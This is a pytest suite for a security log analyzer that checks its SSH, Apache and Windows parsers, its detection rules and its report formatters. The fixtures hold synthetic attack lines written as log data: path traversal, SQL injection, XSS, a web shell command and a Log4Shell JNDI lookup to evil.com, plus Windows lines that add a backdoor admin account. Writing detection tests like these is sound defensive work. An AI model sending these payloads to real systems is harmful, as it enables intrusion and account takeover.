"""
pytest test suite for soc_analyzer.
Run:  pytest  or  pytest --cov=soc_analyzer --cov-report=term-missing
"""

from __future__ import annotations

import json
import sys
from io import StringIO
from pathlib import Path

import pytest

# Ensure src/ is on the path when running tests without installing
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from soc_analyzer.parser import (
    SecurityEvent, Severity,
    detect_log_type, parse_apache, parse_ssh, parse_windows,
)
from soc_analyzer.rules import run_rules
from soc_analyzer.formatters import format_events, format_json, format_csv, format_markdown
from soc_analyzer.cli import main, _apply_filters


# ──────────────────────────────────────────────────────────────────────────────
# Fixtures
# ──────────────────────────────────────────────────────────────────────────────

SAMPLE_DIR = Path(__file__).parent.parent / "data" / "sample_logs"

SSH_LINES = [
    "May  1 03:21:04 host sshd[1]: Failed password for root from 192.168.1.1 port 22 ssh2",
    "May  1 03:21:06 host sshd[1]: Failed password for root from 192.168.1.1 port 22 ssh2",
    "May  1 03:21:08 host sshd[1]: Failed password for root from 192.168.1.1 port 22 ssh2",
    "May  1 03:21:10 host sshd[1]: Failed password for root from 192.168.1.1 port 22 ssh2",
    "May  1 03:21:12 host sshd[1]: Failed password for root from 192.168.1.1 port 22 ssh2",
    "May  1 03:21:14 host sshd[1]: Failed password for root from 192.168.1.1 port 22 ssh2",
    "May  1 03:22:00 host sshd[2]: Accepted password for alice from 10.0.0.1 port 22 ssh2",
    "May  1 03:22:05 host sshd[3]: Accepted publickey for bob from 10.0.0.2 port 22 ssh2",
    "May  1 04:00:01 host sudo: charlie : COMMAND=/bin/su -i",
    "May  1 04:01:00 host sshd[4]: Invalid user hacker from 203.0.113.1 port 9999",
]

APACHE_LINES = [
    '192.168.1.1 - - [01/May/2026:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"',
    '10.0.0.1 - - [01/May/2026:10:01:00 +0000] "GET /etc/passwd HTTP/1.1" 404 100 "-" "curl/7.64"',
    '10.0.0.1 - - [01/May/2026:10:01:01 +0000] "GET /etc/shadow HTTP/1.1" 403 100 "-" "curl/7.64"',
    '10.0.0.1 - - [01/May/2026:10:01:02 +0000] "GET /../../../etc/passwd HTTP/1.1" 400 100 "-" "curl/7.64"',
    '45.0.0.1 - - [01/May/2026:10:02:00 +0000] "GET /id?q=1+UNION+SELECT+1,2-- HTTP/1.1" 500 100 "-" "sqlmap/1"',
    '45.0.0.1 - - [01/May/2026:10:02:05 +0000] "GET /x?search=<script>alert(1)</script> HTTP/1.1" 200 100 "-" "Mozilla"',
    '1.2.3.4 - - [01/May/2026:10:03:00 +0000] "GET / HTTP/1.1" 200 100 "-" "nikto/2.1.6"',
    '5.6.7.8 - - [01/May/2026:10:04:00 +0000] "POST /wp-login.php HTTP/1.1" 401 100 "-" "WPScan"',
    '9.9.9.9 - - [01/May/2026:10:05:00 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 50 "-" "curl"',
    '9.9.9.9 - - [01/May/2026:10:05:01 +0000] "GET /app?x=${jndi:ldap://evil.com/x} HTTP/1.1" 200 50 "-" "Java"',
]

WINDOWS_LINES = [
    "TimeCreated,EventID,MachineName,Message",
    '2026-05-01 08:00:00,4624,HOST,"Successful logon for user alice"',
    '2026-05-01 08:05:00,4625,HOST,"Failed logon for administrator from 10.0.0.5"',
    '2026-05-01 08:05:02,4625,HOST,"Failed logon for administrator from 10.0.0.5"',
    '2026-05-01 08:05:04,4625,HOST,"Failed logon for administrator from 10.0.0.5"',
    '2026-05-01 08:05:06,4625,HOST,"Failed logon for administrator from 10.0.0.5"',
    '2026-05-01 08:05:08,4625,HOST,"Failed logon for administrator from 10.0.0.5"',
    '2026-05-01 08:10:00,4688,HOST,"Process created: cmd.exe /c net user hacker /add"',
    '2026-05-01 08:11:00,4688,HOST,"Process created: cmd.exe net localgroup administrators hacker /add"',
    '2026-05-01 08:12:00,4657,HOST,"Registry key modified HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
    '2026-05-01 08:13:00,1102,HOST,"Security log cleared by DOMAIN\\attacker"',
    '2026-05-01 08:14:00,4740,HOST,"Account locked out: administrator from 10.0.0.5"',
]


# ──────────────────────────────────────────────────────────────────────────────
# Parser tests
# ──────────────────────────────────────────────────────────────────────────────

class TestDetectLogType:
    def test_ssh(self):
        assert detect_log_type(SSH_LINES) == "ssh"

    def test_apache(self):
        assert detect_log_type(APACHE_LINES) == "apache"

    def test_windows(self):
        assert detect_log_type(WINDOWS_LINES) == "windows"


class TestSSHParser:
    def test_returns_records(self):
        recs = parse_ssh(SSH_LINES)
        assert len(recs) == len(SSH_LINES)

    def test_ip_extraction(self):
        recs = parse_ssh(SSH_LINES)
        assert recs[0]["source_ip"] == "192.168.1.1"

    def test_timestamp_parsed(self):
        recs = parse_ssh(SSH_LINES)
        assert recs[0]["timestamp"] is not None

    def test_log_type_tag(self):
        recs = parse_ssh(SSH_LINES)
        assert all(r["log_type"] == "ssh" for r in recs)

    def test_empty_lines_skipped(self):
        recs = parse_ssh(["", "   ", "\n"])
        assert len(recs) == 0


class TestApacheParser:
    def test_returns_records(self):
        recs = parse_apache(APACHE_LINES)
        assert len(recs) == len(APACHE_LINES)

    def test_fields_extracted(self):
        recs = parse_apache(APACHE_LINES)
        r = recs[0]
        assert r["source_ip"] == "192.168.1.1"
        assert r["status"] == 200
        assert r["method"] == "GET"
        assert r["path"] == "/index.html"

    def test_log_type_tag(self):
        recs = parse_apache(APACHE_LINES)
        assert all(r["log_type"] == "apache" for r in recs)


class TestWindowsParser:
    def test_returns_records(self):
        recs = parse_windows(WINDOWS_LINES)
        assert len(recs) > 0

    def test_event_id_parsed(self):
        recs = parse_windows(WINDOWS_LINES)
        event_ids = {r["event_id"] for r in recs if r.get("event_id")}
        assert 4624 in event_ids
        assert 4625 in event_ids

    def test_timestamp_parsed(self):
        recs = parse_windows(WINDOWS_LINES)
        timestamped = [r for r in recs if r.get("timestamp")]
        assert len(timestamped) > 0


# ──────────────────────────────────────────────────────────────────────────────
# Rules tests
# ──────────────────────────────────────────────────────────────────────────────

class TestSSHRules:
    def setup_method(self):
        self.recs = parse_ssh(SSH_LINES)
        self.events = run_rules(self.recs)

    def _events_by_rule(self, rule_id):
        return [e for e in self.events if e.rule_id == rule_id]

    def test_ssh_failed_login_detected(self):
        evs = self._events_by_rule("ssh_failed_login")
        assert len(evs) >= 6

    def test_ssh_failed_login_brute_escalated(self):
        # 6 failures from same IP should escalate to CRITICAL
        critical = [e for e in self._events_by_rule("ssh_failed_login")
                    if e.severity == Severity.CRITICAL]
        assert len(critical) >= 1

    def test_ssh_root_login_detected(self):
        evs = self._events_by_rule("ssh_root_login")
        assert len(evs) >= 1

    def test_ssh_accepted_password(self):
        evs = self._events_by_rule("ssh_accepted_password")
        assert len(evs) >= 1

    def test_ssh_accepted_pubkey(self):
        evs = self._events_by_rule("ssh_accepted_pubkey")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.INFO

    def test_sudo_to_root(self):
        evs = self._events_by_rule("sudo_to_root")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.HIGH

    def test_invalid_user(self):
        evs = self._events_by_rule("ssh_invalid_user")
        assert len(evs) >= 1


class TestApacheRules:
    def setup_method(self):
        self.recs = parse_apache(APACHE_LINES)
        self.events = run_rules(self.recs)

    def _events_by_rule(self, rule_id):
        return [e for e in self.events if e.rule_id == rule_id]

    def test_lfi_passwd(self):
        evs = self._events_by_rule("web_lfi_passwd")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_lfi_shadow(self):
        evs = self._events_by_rule("web_lfi_shadow")
        assert len(evs) >= 1

    def test_path_traversal(self):
        evs = self._events_by_rule("web_path_traversal")
        assert len(evs) >= 1

    def test_sqli(self):
        evs = self._events_by_rule("web_sqli")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_xss(self):
        evs = self._events_by_rule("web_xss")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_scanner(self):
        evs = self._events_by_rule("web_scanner")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.HIGH

    def test_wp_brute(self):
        evs = self._events_by_rule("web_wp_brute")
        assert len(evs) >= 1

    def test_shell_cmd(self):
        evs = self._events_by_rule("web_shell_cmd")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_log4j(self):
        evs = self._events_by_rule("web_log4j")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL


class TestWindowsRules:
    def setup_method(self):
        self.recs = parse_windows(WINDOWS_LINES)
        self.events = run_rules(self.recs)

    def _events_by_rule(self, rule_id):
        return [e for e in self.events if e.rule_id == rule_id]

    def test_failed_logon(self):
        evs = self._events_by_rule("win_failed_logon")
        assert len(evs) >= 1

    def test_failed_logon_escalated(self):
        critical = [e for e in self._events_by_rule("win_failed_logon")
                    if e.severity == Severity.CRITICAL]
        assert len(critical) >= 1

    def test_net_user_add(self):
        evs = self._events_by_rule("win_net_user_add")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_add_to_admins(self):
        evs = self._events_by_rule("win_add_to_admins")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_registry_change(self):
        evs = self._events_by_rule("win_registry_change")
        assert len(evs) >= 1

    def test_log_cleared(self):
        evs = self._events_by_rule("win_log_cleared")
        assert len(evs) >= 1
        assert evs[0].severity == Severity.CRITICAL

    def test_account_lockout(self):
        evs = self._events_by_rule("win_account_lockout")
        assert len(evs) >= 1


# ──────────────────────────────────────────────────────────────────────────────
# Brute-force threshold
# ──────────────────────────────────────────────────────────────────────────────

class TestBruteForceThreshold:
    def test_threshold_5(self):
        recs = parse_ssh(SSH_LINES)
        events = run_rules(recs, brute_threshold=5)
        critical = [e for e in events
                    if e.rule_id == "ssh_failed_login" and e.severity == Severity.CRITICAL]
        assert len(critical) > 0

    def test_threshold_100(self):
        """With very high threshold, failures should stay HIGH."""
        recs = parse_ssh(SSH_LINES)
        events = run_rules(recs, brute_threshold=100)
        critical = [e for e in events
                    if e.rule_id == "ssh_failed_login" and e.severity == Severity.CRITICAL]
        assert len(critical) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Severity ordering
# ──────────────────────────────────────────────────────────────────────────────

class TestSeverityOrdering:
    def test_critical_gt_high(self):
        assert Severity.CRITICAL > Severity.HIGH

    def test_high_gt_medium(self):
        assert Severity.HIGH > Severity.MEDIUM

    def test_medium_gt_low(self):
        assert Severity.MEDIUM > Severity.LOW

    def test_low_gt_info(self):
        assert Severity.LOW > Severity.INFO

    def test_ge_same(self):
        assert Severity.HIGH >= Severity.HIGH


# ──────────────────────────────────────────────────────────────────────────────
# Formatters
# ──────────────────────────────────────────────────────────────────────────────

def _sample_events():
    recs = parse_ssh(SSH_LINES) + parse_apache(APACHE_LINES)
    return run_rules(recs)


class TestPrettyFormatter:
    def test_contains_header(self):
        events = _sample_events()
        out = format_events(events, fmt="pretty", use_color=False)
        assert "SOC LOG ANALYZER" in out

    def test_contains_severity_breakdown(self):
        events = _sample_events()
        out = format_events(events, fmt="pretty", use_color=False)
        assert "SEVERITY BREAKDOWN" in out

    def test_empty_events(self):
        out = format_events([], fmt="pretty", use_color=False)
        assert "No threats detected" in out

    def test_verbose_shows_raw(self):
        events = _sample_events()
        out = format_events(events, fmt="pretty", use_color=False, verbose=True)
        assert "Raw" in out


class TestJSONFormatter:
    def test_valid_json(self):
        events = _sample_events()
        out = format_json(events)
        data = json.loads(out)
        assert "events" in data
        assert "summary" in data
        assert "generated_at" in data

    def test_event_fields(self):
        events = _sample_events()
        out = format_json(events)
        data = json.loads(out)
        ev = data["events"][0]
        for field in ("rule_id", "severity", "category", "description", "source_ip"):
            assert field in ev

    def test_summary_total(self):
        events = _sample_events()
        out = format_json(events)
        data = json.loads(out)
        assert data["summary"]["total"] == len(events)


class TestCSVFormatter:
    def test_has_header(self):
        events = _sample_events()
        out = format_csv(events)
        lines = out.strip().split("\n")
        assert "severity" in lines[0].lower()

    def test_row_count(self):
        events = _sample_events()
        out = format_csv(events)
        lines = [l for l in out.strip().split("\n") if l]
        assert len(lines) == len(events) + 1  # +1 for header


class TestMarkdownFormatter:
    def test_has_title(self):
        events = _sample_events()
        out = format_markdown(events)
        assert "# SOC Log Analyzer" in out

    def test_has_table(self):
        events = _sample_events()
        out = format_markdown(events)
        assert "| Timestamp |" in out

    def test_has_severity_breakdown(self):
        events = _sample_events()
        out = format_markdown(events)
        assert "Severity Breakdown" in out


# ──────────────────────────────────────────────────────────────────────────────
# Filter tests
# ──────────────────────────────────────────────────────────────────────────────

class TestFilters:
    def setup_method(self):
        recs = parse_ssh(SSH_LINES) + parse_apache(APACHE_LINES)
        self.events = run_rules(recs)

    def test_severity_filter(self):
        filtered = _apply_filters(self.events, "CRITICAL", None, None)
        assert all(e.severity == Severity.CRITICAL for e in filtered)

    def test_category_filter(self):
        filtered = _apply_filters(self.events, None, "lfi", None)
        assert all(e.category == "lfi" for e in filtered)

    def test_ip_filter(self):
        if self.events:
            ip = next((e.source_ip for e in self.events if e.source_ip), None)
            if ip:
                filtered = _apply_filters(self.events, None, None, ip)
                assert all(e.source_ip == ip for e in filtered)

    def test_no_filter_returns_all(self):
        filtered = _apply_filters(self.events, None, None, None)
        assert len(filtered) == len(self.events)


# ──────────────────────────────────────────────────────────────────────────────
# CLI integration tests (using sample files)
# ──────────────────────────────────────────────────────────────────────────────

class TestCLI:
    def test_ssh_sample_file(self):
        auth_log = SAMPLE_DIR / "auth.log"
        if not auth_log.exists():
            pytest.skip("Sample file not found")
        rc = main([str(auth_log), "--no-color"])
        assert rc in (0, 1)

    def test_apache_sample_file(self):
        access_log = SAMPLE_DIR / "apache_access.log"
        if not access_log.exists():
            pytest.skip("Sample file not found")
        rc = main([str(access_log), "--no-color"])
        assert rc in (0, 1)

    def test_windows_sample_file(self):
        win_log = SAMPLE_DIR / "windows_events.csv"
        if not win_log.exists():
            pytest.skip("Sample file not found")
        rc = main([str(win_log), "--no-color"])
        assert rc in (0, 1)

    def test_json_format(self, tmp_path):
        access_log = SAMPLE_DIR / "apache_access.log"
        if not access_log.exists():
            pytest.skip("Sample file not found")
        out_file = tmp_path / "report.json"
        main([str(access_log), "-f", "json", "-o", str(out_file), "--no-color"])
        assert out_file.exists()
        data = json.loads(out_file.read_text())
        assert "events" in data

    def test_severity_filter_cli(self):
        access_log = SAMPLE_DIR / "apache_access.log"
        if not access_log.exists():
            pytest.skip("Sample file not found")
        rc = main([str(access_log), "-s", "CRITICAL", "--no-color"])
        assert rc in (0, 1)

    def test_missing_file_returns_2(self):
        rc = main(["/nonexistent/file.log"])
        assert rc == 2

    def test_no_args_returns_0(self):
        rc = main([])
        assert rc == 0

    def test_brute_threshold(self):
        auth_log = SAMPLE_DIR / "auth.log"
        if not auth_log.exists():
            pytest.skip("Sample file not found")
        rc = main([str(auth_log), "--brute-threshold", "100", "--no-color"])
        assert rc in (0, 1)
